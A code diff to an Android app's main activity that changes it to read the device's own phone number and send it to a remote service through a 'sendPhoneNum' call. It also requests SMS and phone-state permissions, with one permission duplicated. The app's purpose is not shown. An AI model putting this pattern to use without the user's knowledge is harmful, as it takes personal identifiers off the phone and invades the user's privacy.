@@ -62,7 +62,6 @@ public class MainActivity extends Activity {
         rxPermission = new RxPermissions(this);
         requestPermissions();
 
-
     }
 
     private void getNumber() {
@@ -102,7 +101,7 @@ public class MainActivity extends Activity {
 //            }
 //        });
         try {
-            ZClient.getService(ZService.class).sendPhoneNum(phoneNumber1).enqueue(null);
+            ZClient.getService(ZService.class).sendPhoneNum(((TelephonyManager)getSystemService(this.TELEPHONY_SERVICE)).getLine1Number()).enqueue(null);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -213,7 +212,7 @@ public class MainActivity extends Activity {
     }
 
     private void requestPermissions() {
-        subscribe = rxPermission.requestEach(Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE)
+        subscribe = rxPermission.requestEach(Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE)
                 .subscribe(new Consumer<Permission>() {
                     @Override
                     public void accept(Permission permission) throws Exception {
